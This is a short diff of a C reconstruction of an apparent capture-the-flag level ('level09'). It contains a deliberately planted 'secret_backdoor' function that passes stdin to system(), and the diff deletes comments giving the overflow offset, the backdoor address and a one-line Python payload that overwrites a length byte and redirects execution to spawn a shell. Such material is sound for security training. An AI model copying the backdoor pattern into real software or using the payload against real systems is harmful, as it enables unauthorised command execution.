@@ -11,14 +11,14 @@ typedef struct s_msg
 
 void secret_backdoor()
 {
-	char buff[128]; // 0x80
+	char	buff[128]; // 0x80
 	fgets(buff, 128, stdin);
 	system(buff);
 }
 
 void	set_msg(t_msg* msg)
 {
-	char buff[1024]; // 0x400
+	char	buff[1024]; // 0x400
 	memset(buff, 0, 1024); // 8 * 128 = 0x400
 
 	puts(">: Msg @Unix-Dude");
@@ -30,7 +30,7 @@ void	set_msg(t_msg* msg)
 
 void	set_username(t_msg *msg)
 {
-	char buff[128]; // 0x80
+	char	buff[128]; // 0x80
 	memset(buff, 0, 128); // 8 * 16 = 0x80
 
 	puts(">: Enter your username");
@@ -46,7 +46,7 @@ void	set_username(t_msg *msg)
 
 void	handle_msg(void)
 {
-	t_msg msg;
+	t_msg	msg;
 	memset(&msg.username, 0, 40); // 0x28
 	msg.len = 140; // 0x8c
 	
@@ -65,8 +65,3 @@ int	main(void)
 	handle_msg();
 	return 0;
 }
-
-// 0ffset 200
-// backdoor: 0x55555555488c
-// exploit len 0xd8
-// (python -c "print 40*'\x90' + '\xd8' + '\n' + 200*'\x90' + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'"; cat) | ./level09
